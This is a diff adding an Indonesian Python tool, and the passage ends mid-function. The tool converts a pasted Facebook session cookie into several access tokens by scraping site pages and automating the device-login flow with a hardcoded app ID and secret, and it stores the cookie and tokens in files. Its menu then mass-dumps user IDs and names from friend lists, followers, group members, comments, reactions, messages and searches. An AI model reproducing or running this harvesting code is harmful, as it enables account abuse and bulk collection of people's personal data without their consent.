+            req2 = self.xyz.get('https://graph.facebook.com/me/friends?fields=summary&limit=0&access_token=%s'%(self.token_eaab),cookies=self.cookie).json()['summary']['total_count']
+            req3 = self.xyz.get('https://graph.facebook.com/me?fields=friends.limit(0).fields(id,name,birthday)&access_token=%s'%(self.token_eaaj),cookies=self.cookie).json()['friends']
+            clear()
+            logo()
+        except Exception as e:
+            self.insert_cookie()
+    def insert_cookie(self):
+        print('\nCookie Invalid!')
+        time.sleep(2)
+        clear()
+        logo()
+        print('Apabila Akun A2F On, Pergi Ke')
+        print('https://business.facebook.com/business_locations')
+        print('Untuk Memasukkan Kode Autentikasi')
+        ciko = input('Masukkan Cookie : ')
+        self.token_eaag = self.generate_token_eaag(ciko)
+        self.token_eaab = self.generate_token_eaab(ciko)
+        self.token_eaaj = self.generate_token_eaaj(ciko)
+        try:os.mkdir("login")
+        except:pass
+        open('login/cookie.json','w').write(ciko)
+        open('login/token_eaag.json','w').write(self.token_eaag)
+        open('login/token_eaab.json','w').write(self.token_eaab)
+        open('login/token_eaaj.json','w').write(self.token_eaaj)
+        self.cek_cookies()
+    def generate_token_eaag(self,cok):
+        url = 'https://business.facebook.com/business_locations'
+        req = self.xyz.get(url,cookies={'cookie':cok})
+        tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
+        return(str(tok))
+    def generate_token_eaab(self,cok):
+        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
+        req = self.xyz.get(url,cookies={'cookie':cok})
+        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
+        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
+        roq = self.xyz.get(nek,cookies={'cookie':cok})
+        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
+        return(str(tok))
+    def generate_token_eaaj(self,cok):
+        self.cookie = {'cookie':cok}
+        apk  = '661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e'
+        data = {'access_token': apk, 'scope': ''}
+        req  = self.xyz.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
+        cd   = req['code']
+        ucd  = req['user_code']
+        url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=%s'%(cd,apk)
+        req  = bs(self.xyz.get('https://mbasic.facebook.com/device',cookies=self.cookie).content,'html.parser')
+        raq  = req.find('form',{'method':'post'})
+        dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}
+        rel  = 'https://mbasic.facebook.com' + raq['action']
+        pos  = bs(self.xyz.post(rel,data=dat,cookies=self.cookie).content,'html.parser')
+        dat  = {}
+        raq  = pos.find('form',{'method':'post'})
+        for x in raq('input',{'value':True}):
+            try:
+                if x['name'] == '__CANCEL__' : pass
+                else: dat.update({x['name']:x['value']})
+            except Exception as e: pass
+        rel = 'https://mbasic.facebook.com' + raq['action']
+        pos = bs(self.xyz.post(rel,data=dat,cookies=self.cookie).content,'html.parser')
+        req = self.xyz.get(url,cookies=self.cookie).json()
+        tok = req['access_token']
+        return(str(tok))
+
+#--> Menu Utama
+class main_menu:
+    def __init__(self):
+        self.xyz        = requests.Session()
+        self.cookie     = {'cookie':open('login/cookie.json','r').read()}
+        self.token_eaag = open('login/token_eaag.json','r').read()
+        self.token_eaab = open('login/token_eaab.json','r').read()
+        self.dasbor()
+        self.menu()
+        self.pilih_menu()
+    def dasbor(self):
+        q = ' '*6
+        z = {}
+        try:
+            req = self.xyz.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(self.token_eaag),cookies=self.cookie).json()
+            if len(req['name']) > 18: z.update({'Nama':str(req['name'])[:15]+'...'})
+            else: z.update({'Nama':str(req['name'])[:15]})
+            z.update({'ID':str(req['id'])})
+        except Exception as e: login()
+        try:
+            bln    = {'01':'Januari', '02':'Februari', '03':'Maret', '04':'April', '05':'Mei', '06':'Juni', '07':'Juli', '08':'Agustus', '09':'September', '10':'Oktober', '11':'November', '12':'Desember'}
+            t,m,h  = [x['created_time'].split('T')[0] for x in self.xyz.get('https://graph.facebook.com/me/albums?fields=id,name,created_time&limit=1000&access_token=%s'%(self.token_eaag),cookies=self.cookie).json()['data'] if x['name']=='Foto Profil'][0].split('-')
+            z.update({'Buat':'%s %s %s'%(h,bln[m],t)})
+        except Exception as e: pass
+        try:
+            fren = str(self.xyz.get('https://graph.facebook.com/me/friends?fields=summary&limit=0&access_token=%s'%(self.token_eaab),cookies=self.cookie).json()['summary']['total_count'])
+            z.update({'Teman':fren})
+        except Exception as e: pass
+        try:
+            fols = str(self.xyz.get('https://graph.facebook.com/me/subscribers?limit=0&access_token=%s'%(self.token_eaag),cookies=self.cookie).json()['summary']['total_count'])
+            z.update({'Folls':fols})
+        except Exception as e: pass
+        print('%s╭────────────[ Welcome ]───────────╮'%(q))
+        for x,y in zip(z.keys(),z.values()):
+            print('%s│    %s%s: %s%s│'%(q,x,' '*(6-len(x)),y,' '*(22-len(y))))
+        print('%s╰──────────────────────────────────╯'%(q))
+    def menu(self):
+        c = ' '*0
+        print('\n%s  [ Account ]        [ Group ]        [ Post ]\n'%(c))
+        print('%s[01] Friendlist    [15] Members     [19] Comment'%(c))
+        print('%s[02] Followers     [16] Timeline    [20] React'%(c))
+        print('%s[03] Comment       [17] Comment'%(c))
+        print('%s[04] React         [18] React'%(c))
+        print('%s[05] Message'%(c))
+        print('%s[06] Name'%(c))
+        print('%s[07] Timeline'%(c))
+        print('%s[08] Hashtag'%(c))
+        print('%s[09] Email'%(c))
+        print('%s[10] Phone'%(c))
+        print('%s[11] Username'%(c))
+        print('%s[12] ID Random'%(c))
+        print('%s[13] Suggestion'%(c))
+        print('%s[14] FL Dari FL'%(c))
+    def pilih_menu(self):
+        xo = input('\nPilih : ')
+        print('')
+        if xo in   ['1', '01' ,'a']: dump_friendlist()
+        elif xo in ['2', '02' ,'b']: dump_followers()
+        elif xo in ['3', '03' ,'c']: dump_react_comment('A_K')
+        elif xo in ['4', '04' ,'d']: dump_react_comment('A_R')
+        elif xo in ['5', '05' ,'e']: dump_owner_account('PS')
+        elif xo in ['6', '06' ,'f']: dump_owner_account('NM')
+        elif xo in ['7', '07' ,'g']: dump_owner_account('TL')
+        elif xo in ['8', '08' ,'h']: dump_owner_account('HS')
+        elif xo in ['9', '009','i']: dump_random('EM')
+        elif xo in ['10','010','j']: dump_random('PO')
+        elif xo in ['11','011','k']: dump_random('US')
+        elif xo in ['12','012','l']: dump_random('ID')
+        elif xo in ['13','013','m']: dump_owner_account('SU')
+        elif xo in ['14','014','n']: dump_fl_fl()
+        elif xo in ['15','015','o']: dump_react_comment('MB')
+        elif xo in ['16','016','p']: dump_react_comment('TL')
+        elif xo in ['17','017','q']: dump_react_comment('G_K')
+        elif xo in ['18','018','r']: dump_react_comment('G_R')
+        elif xo in ['19','019','s']: dump_react_comment('P_K')
+        elif xo in ['20','020','t']: dump_react_comment('P_R')
+        simpan_file()
+
+#--> Dump Friendlist
+class dump_friendlist:
+    def __init__(self):
+        global dump
+        dump = self.dump = []
+        self.fail        = []
+        self.pisah       = pemisah
+        self.xyz         = requests.Session()
+        self.cookie      = {'cookie':open('login/cookie.json','r').read()}
+        self.token_eaag  = open('login/token_eaag.json','r').read()
+        self.token_eaab  = open('login/token_eaab.json','r').read()
+        self.token_eaaj  = open('login/token_eaaj.json','r').read()
+        self.main()
+    def main(self):
+        print('Banyak ID, Pisahkan Dgn (,)')
+        id = input('Masukkan ID : ').split(',')
+        print('')
+        for f in id:
+            if f == 'me': io = f
+            elif (re.findall("[a-zA-Z]",str(f))) : io = user_to_id(f)
+            else : io = f
+            self.cek(io)
+        print('')
+        for d in self.fail:
+            try: id.remove(d)
+            except Exception as e: continue
+        for s in id:
+            if s == 'me': io = s
+            elif (re.findall("[a-zA-Z]",str(s))) : io = user_to_id(s)
+            else : io = s
+            self.requ(io)
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def cek(self,id):
+        try: 
+            nama  = str(self.xyz.get('https://graph.facebook.com/%s?fields=name&access_token=%s'%(id,self.token_eaag),cookies=self.cookie).json()['name'])
+            teman = str(self.xyz.get('https://graph.facebook.com/%s?fields=friends.limit(0).fields(id,name,birthday)&access_token=%s'%(id,self.token_eaaj),cookies=self.cookie).json()['friends']['summary']['total_count'])
+            print(' • %s --> %s Teman'%(nama,teman))
+        except Exception as e:
+            print(' • %s --> Kesalahan/Private'%(id))
+            self.fail.append(id)
+    def requ(self,id):
+        url = 'https://graph.facebook.com/%s?fields=friends.limit(5000).fields(id,name,birthday)&access_token=%s'%(id,self.token_eaaj)
+        try:
+            req = self.xyz.get(url,cookies=self.cookie).json()
+            for y in req['friends']['data']:
+                try:
+                    id, nama = y['id'], y['name']
+                    format = '%s%s%s'%(id,self.pisah,nama)
+                    self.dump.append(format)
+                    animasi()
+                except Exception as e: pass
+        except Exception as e: pass
+
+#--> Dump Followers
+class dump_followers:
+    def __init__(self):
+        global dump
+        dump = self.dump = []
+        self.fail        = []
+        self.pisah       = pemisah
+        self.xyz         = requests.Session()
+        self.cookie      = {'cookie':open('login/cookie.json','r').read()}
+        self.token_eaag  = open('login/token_eaag.json','r').read()
+        self.token_eaab  = open('login/token_eaab.json','r').read()
+        self.main()
+    def main(self):
+        print('Banyak ID, Pisahkan Dgn (,)')
+        id = input('Masukkan ID : ').split(',')
+        print('')
+        for f in id:
+            if f == 'me': io = f
+            elif (re.findall("[a-zA-Z]",str(f))) : io = user_to_id(f)
+            else : io = f
+            self.cek(io)
+        print('')
+        for d in self.fail:
+            try: id.remove(d)
+            except Exception as e: continue
+        for s in id:
+            if s == 'me': io = s
+            elif (re.findall("[a-zA-Z]",str(s))) : io = user_to_id(s)
+            else : io = s
+            self.requ('https://graph.facebook.com/%s/subscribers?limit=1000&access_token=%s'%(io,self.token_eaag))
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def cek(self,id):
+        try: 
+            nama  = str(self.xyz.get('https://graph.facebook.com/%s?fields=name&access_token=%s'%(id,self.token_eaag),cookies=self.cookie).json()['name'])
+            folls = str(self.xyz.get('https://graph.facebook.com/%s/subscribers?limit=0&access_token=%s'%(id,self.token_eaag),cookies=self.cookie).json()['summary']['total_count'])
+            print(' • %s --> %s Folls'%(nama,folls))
+        except Exception as e:
+            print(' • %s --> Kesalahan/Private'%(id))
+            self.fail.append(id)
+    def requ(self,url):
+        try:
+            req = self.xyz.get(url,cookies=self.cookie).json()
+            for y in req['data']:
+                try:
+                    id, nama = y['id'], y['name']
+                    format = '%s%s%s'%(id,self.pisah,nama)
+                    self.dump.append(format)
+                    animasi()
+                except Exception as e: pass
+            self.requ(req['paging']['next'])
+        except Exception as e: pass
+
+#--> Dump Friendlist Dari Friendlist
+class dump_fl_fl:
+    def __init__(self):
+        global dump
+        dump = self.dump = []
+        self.fail        = []
+        self.pisah       = pemisah
+        self.xyz         = requests.Session()
+        self.cookie      = {'cookie':open('login/cookie.json','r').read()}
+        self.token_eaag  = open('login/token_eaag.json','r').read()
+        self.token_eaab  = open('login/token_eaab.json','r').read()
+        self.main()
+    def main(self):
+        print('Banyak ID, Pisahkan Dgn (,)')
+        id = input('Masukkan ID : ').split(',')
+        print('')
+        for f in id:
+            if f == 'me': io = f
+            elif (re.findall("[a-zA-Z]",str(f))) : io = user_to_id(f)
+            else : io = f
+            self.cek(io)
+        print('')
+        for d in self.fail:
+            try: id.remove(d)
+            except Exception as e: continue
+        self.t1 = input('Pilih ID Tua/Muda [t/m] : ').lower()
+        self.t2 = input('Berapa ID Per Masing" Akun : ')
+        print('')
+        try:
+            for s in id:
+                if s == 'me': io = s
+                elif (re.findall("[a-zA-Z]",str(s))) : io = user_to_id(s)
+                else : io = s
+                lid = self.requ(io,'1')
+            try:
+                for h in lid:
+                    self.requ(h.split(self.pisah)[0],'2')
+            except Exception as e:
+                pass
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def cek(self,id):
+        try: 
+            nama  = str(self.xyz.get('https://graph.facebook.com/%s?fields=name&access_token=%s'%(id,self.token_eaag),cookies=self.cookie).json()['name'])
+            teman = str(self.xyz.get('https://graph.facebook.com/%s/friends?fields=summary&limit=0&access_token=%s'%(id,self.token_eaab),cookies=self.cookie).json()['summary']['total_count'])
+            print(' • %s --> %s Teman'%(nama,teman))
+        except Exception as e:
+            print(' • %s --> Kesalahan/Private'%(id))
+            self.fail.append(id)
+    def requ(self,id,tp):
+        url = 'https://graph.facebook.com/%s/friends?fields=id,name&limit=5000&access_token=%s'%(id,self.token_eaab)
+        try:
+            req = self.xyz.get(url,cookies=self.cookie).json()
+            pen = [ '%s%s%s'%(y['id'],self.pisah,y['name']) for y in req['data']]
+            sm_ = []
+            sm  = []
+            if self.t1 in ['1','01','t','tua']:
+                for z in pen:
+                    sm.append(z)
+                    if len(sm) == int(self.t2): break
+            else:
+                for z in pen:
+                    sm_.insert(0,z)
+                for z_ in sm_:
+                    sm.append(z_)
+                    if len(sm) == int(self.t2): break
+                if tp == '1':
+                    return(sm)
+                else:
+                    for h in sm:
+                        if h in self.dump:pass
+                        else:self.dump.append(h)
+                        animasi()
+        except Exception as e: pass
+
+#--> Dump React, Comment, Member, Photo, Timeline
+class dump_react_comment:
+
+    #--> Penampungan Awal
+    def __init__(self,tp):
+        global dump
+        dump = self.dump = []
+        self.fail        = []
+        self.pisah       = pemisah
+        self.limit       = '100'
+        self.xyz         = requests.Session()
+        self.cookie      = {'cookie':open('login/cookie.json','r').read()}
+        self.token_eaag  = open('login/token_eaag.json','r').read()
+        self.token_eaab  = open('login/token_eaab.json','r').read()
+        if tp   == 'A_K': self.modul = 'K'; self.main_A() #--> Dump Comment Account
+        elif tp == 'A_R': self.modul = 'R'; self.main_A() #--> Dump React Account
+        elif tp == 'G_K': self.modul = 'K'; self.main_G() #--> Dump Comment Group
+        elif tp == 'G_R': self.modul = 'R'; self.main_G() #--> Dump React Group
+        elif tp == 'P_K': self.modul = 'K'; self.main_P() #--> Dump Comment Post
+        elif tp == 'P_R': self.modul = 'R'; self.main_P() #--> Dump React Post
+        elif tp == 'TL' : self.modul = 'T'; self.main_tl_mb() #--> Dump Timeline
+        elif tp == 'MB' : self.modul = 'M'; self.main_tl_mb() #--> Dump Member
+    
+    #--> Dump Post Account
+    def main_A(self):
+        print('Banyak ID, Pisahkan Dgn (,)')
+        id = input('Masukkan ID : ').split(',')
+        print('')
+        for f in id:
+            if f == 'me': io = f
+            elif (re.findall("[a-zA-Z]",str(f))) : io = user_to_id(f)
+            else : io = f
+            self.cek_A(io)
+        print('')
+        print('Tekan ctrl+c Untuk Berhenti')
+        for d in self.fail:
+            try: id.remove(d)
+            except Exception as e: continue
+        try:
+            for s in id:
+                if s == 'me': io = s
+                elif (re.findall("[a-zA-Z]",str(s))) : io = user_to_id(s)
+                else : io = s
+                self.requ1_A(io)
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def cek_A(self,id):
+        try: 
+            nama  = str(self.xyz.get('https://graph.facebook.com/%s?fields=name&access_token=%s'%(id,self.token_eaag),cookies=self.cookie).json()['name'])
+            lisz  = [x['id'] for x in self.xyz.get('https://graph.facebook.com/%s/posts?fields=id&limit=%s&access_token=%s'%(id,self.limit,self.token_eaag),cookies=self.cookie).json()['data']]
+            post  = str(len(lisz))
+            print(' • %s --> %s Post'%(nama,post))
+        except Exception as e:
+            print(' • %s --> Kesalahan/Private'%(id))
+            self.fail.append(id)
+    def requ1_A(self,id):
+        lisz  = [x['id'] for x in self.xyz.get('https://graph.facebook.com/%s/posts?fields=id&limit=%s&access_token=%s'%(id,self.limit,self.token_eaag),cookies=self.cookie).json()['data']]
+        try:
+            for pid in lisz:
+                if self.modul == 'K':
+                    url = 'https://mbasic.facebook.com/' + pid
+                    self.main_requ_comment(url)
+                else:
+                    self.main_requ_react(pid)
+        except Exception as e: pass
+    
+    #--> Dump Post Group
+    def main_G(self):
+        print('Banyak ID, Pisahkan Dgn (,)')
+        id = input('Masukkan ID Grup : ').split(',')
+        print('')
+        for f in id:
+            if (re.findall("[a-zA-Z]",str(f))) : io = group_to_id(f)
+            else : io = f
+            self.cek_G(io)
+        print('')
+        print('Tekan ctrl+c Untuk Berhenti')
+        for d in self.fail:
+            try: id.remove(d)
+            except Exception as e: continue
+        try:
+            for s in id:
+                if (re.findall("[a-zA-Z]",str(s))) : io = group_to_id(s)
+                else : io = s
+                self.requ1_G(io)
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def cek_G(self,id):
+        try:
+            req = self.xyz.get('https://graph.facebook.com/%s?access_token=%s'%(id,self.token_eaag),cookies=self.cookie).json()
+            if req['privacy'] == 'OPEN':
+                try:
+                    raq = bs(self.xyz.get('https://mbasic.facebook.com/groups/%s?view=info'%(id),cookies=self.cookie).content,'html.parser')
+                    agt = str([c.text for c in raq.find_all('tr') if 'Anggota' in str(c)][0].replace('Anggota',''))
+                    pos = [x['id'] for x in self.xyz.get('https://graph.facebook.com/%s/feed?fields=id&limit=%s&access_token=%s'%(id,self.limit,self.token_eaag),cookies=self.cookie).json()['data']]
+                except Exception as e: pass
+                print(' • %s --> %s Members & %s Posts'%(str(req['name']),agt,str(len(pos))))
+            else:
+                print(' • %s --> Kesalahan/Private'%(id))
+                self.fail.append(id)
+        except Exception as e:
+            print(' • %s --> Kesalahan/Private'%(id))
+            self.fail.append(id)
+    def requ1_G(self,id):
+        lisz  = [x['id'] for x in self.xyz.get('https://graph.facebook.com/%s/feed?fields=id&limit=%s&access_token=%s'%(id,self.limit,self.token_eaag),cookies=self.cookie).json()['data']]
+        try:
+            for pid in lisz:
+                if self.modul == 'K':
+                    url = 'https://mbasic.facebook.com/' + pid
+                    self.main_requ_comment(url)
+                else:
+                    self.main_requ_react(pid)
+        except Exception as e: pass
+    
+    #--> Dump Post
+    def main_P(self):
+        print('Banyak ID, Pisahkan Dgn (,)')
+        id = input('Masukkan ID Post : ').split(',')
+        print('')
+        print('Tekan ctrl+c Untuk Berhenti')
+        try:
+            for pid in id:
+                if self.modul == 'K':
+                    url = 'https://mbasic.facebook.com/' + pid
+                    self.main_requ_comment(url)
+                else:
+                    self.main_requ_react(pid)
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+
+    #--> Main Dump Comment
+    def main_requ_comment(self,url):
+        try:
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for x in req.find_all('h3'):
+                try:
+                    v    = x.find('a',href=True)
+                    nama = v.text
+                    if 'profile.php' in v['href']: id = re.search('profile.php\?id\=(.*?)\&amp',str(v)).group(1)
+                    else: id = user_to_id(v['href'].split('?')[0].replace('/',''))
+                    format = '%s%s%s'%(id,self.pisah,nama)
+                    if format in self.dump:pass
+                    else:self.dump.append(format)
+                    animasi()
+                except Exception as e: continue
+            nek = 'https://mbasic.facebook.com' + req.find('a',string=' Lihat komentar sebelumnya…')['href']
+            self.main_requ_comment(nek)
+        except Exception as e: pass
+
+    #--> Main Dump React
+    def main_requ_react(self,id):
+        try:
+            url = 'https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier=' + id.split('_')[1]
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for y in req.find_all('a',href=True):
+                try:
+                    if '/ufi/reaction/profile/browser/fetch/?ft_ent_identifier' in y['href']:
+                        if 'Semua' in y.text: pass
+                        elif 'reaction_type=0' in str(y): pass
+                        else:
+                            lk1 = 'https://mbasic.facebook.com' + y['href'].replace('limit=10','limit=50')
+                            self.scrap_react(lk1)
+                except Exception as e: continue
+        except Exception as e: pass
+    def scrap_react(self,url):
+        try:
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for z in req.find_all('h3'):
+                try:
+                    v    = z.find('a',href=True)
+                    nama = v.text
+                    if 'profile.php' in v['href']: id = re.search('profile.php\?id\=(.*?)\&amp',str(v)).group(1)
+                    else: id = v['href'].split('?')[0].replace('/','')
+                    format = '%s%s%s'%(id,self.pisah,nama)
+                    if format in self.dump:pass
+                    else:self.dump.append(format)
+                    animasi()
+                except Exception as e: continue
+            nek = 'https://mbasic.facebook.com' + req.find('a',string='Lihat Selengkapnya')['href'].replace('limit=10','limit=50')
+            self.scrap_react(nek)
+        except Exception as e: pass
+
+    #--> Dump Timeline & Member Group
+    def main_tl_mb(self):
+        print('Banyak ID, Pisahkan Dgn (,)')
+        id = input('Masukkan ID Grup : ').split(',')
+        print('')
+        for f in id:
+            if (re.findall("[a-zA-Z]",str(f))) : io = group_to_id(f)
+            else : io = f
+            self.cek_G(io)
+        print('')
+        print('Tekan ctrl+c Untuk Berhenti')
+        for d in self.fail:
+            try: id.remove(d)
+            except Exception as e: continue
+        try:
+            for s in id:
+                if (re.findall("[a-zA-Z]",str(s))) : io = group_to_id(s)
+                else : io = s
+                if self.modul == 'T':
+                    self.scrape_tl('https://mbasic.facebook.com/groups/'+io)
+                elif self.modul == 'M':
+                    self.scrape_mb('https://mbasic.facebook.com/browse/group/members/?id=%s&start=0'%(io))
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    
+    #--> Dump Timeline Group
+    def scrape_tl(self,url):
+        try:
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for z in req.find_all('h3'):
+                for po in z.find_all('a',href=True):
+                    try:
+                        if 'mbasic.facebook.com' in po['href']:pass
+                        elif 'story.php' in po['href']:pass
+                        elif 'Halaman' in po.text:pass
+                        elif 'profile.php' in po['href']:
+                            id = re.findall('profile\.php\?id=(.*?)&',str(po['href']))[0]
+                            nm = po.text
+                        else:
+                            id = user_to_id(re.findall('\/(.*?)\/\?refid',str(po['href']))[0])
+                            nm = po.text
+                        format = '%s%s%s'%(id,self.pisah,nm)
+                        if format in self.dump:pass
+                        else:self.dump.append(format)
+                        animasi()
+                    except Exception as e: continue
+            nek = 'https://mbasic.facebook.com' + req.find('a',string='Lihat Postingan Lainnya')['href']
+            self.scrape_tl(nek)
+        except Exception as e: pass
+    
+    #--> Dump Member Group
+    def scrape_mb(self,url):
+        try:
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for z in req.find_all('h3'):
+                for po in z.find_all('a',href=True):
+                    try:
+                        if 'a/friends/add' in po['href']:pass
+                        elif 'profile.php' in po['href']:
+                            id = re.findall('profile\.php\?id=(.*?)&',str(po['href']))[0]
+                            nm = po.text
+                        else:
+                            id = user_to_id(re.findall('\/(.*?)\/\?refid',str(po['href']))[0])
+                            nm = po.text
+                        format = '%s%s%s'%(id,self.pisah,nm)
+                        if format in self.dump:pass
+                        else:self.dump.append(format)
+                        animasi()
+                    except Exception as e: continue
+            nek = 'https://mbasic.facebook.com' + req.find('a',string='Lihat Selengkapnya')['href']
+            self.scrape_mb(nek)
+        except Exception as e: pass
+
+#--> Dump Message, Name, Timeline, Hashtag, Suggestion
+class dump_owner_account:
+    
+    #--> Penampungan Awal
+    def __init__(self,tp):
+        global dump
+        dump = self.dump = []
+        self.fail        = []
+        self.pisah       = pemisah
+        self.xyz         = requests.Session()
+        self.cookie      = {'cookie':open('login/cookie.json','r').read()}
+        self.token_eaag  = open('login/token_eaag.json','r').read()
+        self.token_eaab  = open('login/token_eaab.json','r').read()
+        if tp   == 'PS': self.main_message()    #--> Dump ID From Message
+        elif tp == 'NM': self.main_name()       #--> Dump ID From Name
+        elif tp == 'TL': self.main_timeline()   #--> Dump ID From Timeline
+        elif tp == 'HS': self.main_hashtag()    #--> Dump ID From Hashtag
+        elif tp == 'SU': self.main_suggestion() #--> Dump ID From Suggestion
+    
+    #--> Dump ID From Message
+    def main_message(self):
+        print('Tekan ctrl+c Untuk Berhenti')
+        try: self.scrape_message('https://mbasic.facebook.com/messages')
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def scrape_message(self,url):
+        try:
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for p in req.find_all('a',href=True):
+                if '/messages/read/?tid=cid.c' in p['href']:
+                    try:
+                        if p.text == 'Pengguna Facebook': continue
+                        else:
+                            id   = str(re.search('%3A(.*?)&',p['href']).group(1))
+                            nama = p.text
+                        format = '%s%s%s'%(id,self.pisah,nama)
+                        if format in self.dump: pass
+                        else: self.dump.append(format)
+                        animasi()
+                    except Exception as e: continue
+            nek = 'https://mbasic.facebook.com' + req.find('a',string='Lihat Pesan Sebelumnya')['href']
+            self.scrape_message(nek)
+        except Exception as e: pass
+
+    #--> Dump ID From Name
+    def main_name(self):
+        lid = []
+        print('Banyak Nama, Pisahkan Dgn (,)')
+        id = input('Masukkan Nama : ').lower().split(',')
+        common = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
+        for x in id:
+            for y in common:
+                lid.append('%s %s'%(x,y))
+                lid.append('%s %s'%(y,x))
+        print('')
+        print('Tekan ctrl+c Untuk Berhenti')
+        try:
+            for z in lid:
+                url = 'https://mbasic.facebook.com/search/people/?q=' + z
+                self.scrape_name(url)
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def scrape_name(self,url):
+        try:
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for p in req.find_all('a',href=True):
+                try:
+                    if "<img alt=" in str(p):
+                        if "home.php" in str(p["href"]): continue
+                        elif 'profile.php' in str(p["href"]):
+                            id   = re.search('"/profile\.php\?id=(.*?)&"',str(p)).group(1)
+                            nama = p.find("img")['alt'].replace(", profile picture","")
+                        elif 'refid' in str(p["href"]):
+                            id   = user_to_id(re.search("/(.*?)\?",str(p)).group(1))
+                            nama = p.find("img")['alt'].replace(", profile picture","")
+                        format = '%s%s%s'%(id,self.pisah,nama)
+                        if format in self.dump: pass
+                        else: self.dump.append(format)
+                    animasi()
+                except Exception as e: continue
+            nek = req.find('a',string='Lihat Hasil Selanjutnya')['href']
+            self.scrape_name(nek)
+        except Exception as e: pass
+    
+    #--> Dump ID From Timeline
+    def main_timeline(self):
+        print('Tekan ctrl+c Untuk Berhenti')
+        try: self.scrape_timeline('https://mbasic.facebook.com/')
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def scrape_timeline(self,url):
+        try:
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for q in req.find_all('h3'):
+                for p in q.find_all('a',href=True):
+                    try:
+                        if 'mbasic.facebook.com' in p['href']:pass
+                        elif 'sub_view' in p['href']:pass
+                        elif '/?' in p['href']:pass
+                        elif 'profile.php' in str(p["href"]):
+                            id   = str(re.search('\?id=(.*?)&',p['href']).group(1))
+                            nama = str(re.search('>(.*?)<\/a>',str(p)).group(1))
+                        else:
+                            id   = user_to_id(str(re.search('\/(.*?)\?',p['href']).group(1)))
+                            nama = str(re.search('>(.*?)<\/a>',str(p)).group(1))
+                        format = '%s%s%s'%(id,self.pisah,nama)
+                        if format in self.dump: pass
+                        else: self.dump.append(format)
+                        animasi()
+                    except Exception as e: continue
+            nek = 'https://mbasic.facebook.com' + req.find('a',string='Lihat Berita Lain')['href']
+            self.scrape_timeline(nek)
+        except Exception as e: pass
+
+    #--> Dump ID From Hashtag
+    def main_hashtag(self):
+        print('Banyak Hashtag, Pisahkan Dgn (,)')
+        id = input('Masukkan Hashtag : ').replace(' ','').split(',')
+        print('')
+        print('Tekan ctrl+c Untuk Berhenti')
+        try:
+            for z in id:
+                url = 'https://mbasic.facebook.com/hashtag/' + z
+                self.scrape_hashtag(url)
+        except KeyboardInterrupt: pass
+        if len(self.dump) == 0: print('\rDump ID Gagal')
+        else: print('\rBerhasil Mendapat %s ID'%(str(len(self.dump))))
+    def scrape_hashtag(self,url):
+        try:
+            req = bs(self.xyz.get(url,cookies=self.cookie).content,'html.parser')
+            for q in req.find_all('h3'):
+                for p in q.find_all('a',href=True):
+                    try:
+                        if 'mbasic.facebook.com' in p['href']:pass
+                        elif 'sub_view' in p['href']:pass
+                        elif '/?' in p['href']:pass
+                        elif 'profile.php' in str(p["href"]):
+                            id   = str(re.search('\?id=(.*?)&',p['href']).group(1))
+                            nama = str(re.search('>(.*?)<\/a>',str(p)).group(1))
+                        else:
+                            id   = user_to_id(str(re.search('\/(.*?)\?',p['href']).group(1)))
+                            nama = str(re.search('>(.*?)<\/a>',str(p)).group(1))
+                        format = '%s%s%s'%(id,self.pisah,nama)
+                        if format in self.dump: pass
+                        else: self.dump.append(format)
+                        animasi()
+                    except Exception as e: continue
+            nek = req.find('a',string='Lihat Hasil Selanjutnya')['href']
+            self.scrape_hashtag(nek)
+        except Exception as e: pass
+    
+    #--> Dump ID From Suggestion
+    def main_suggestion(self):
+        print('Tekan ctrl+c Untuk Berhenti')
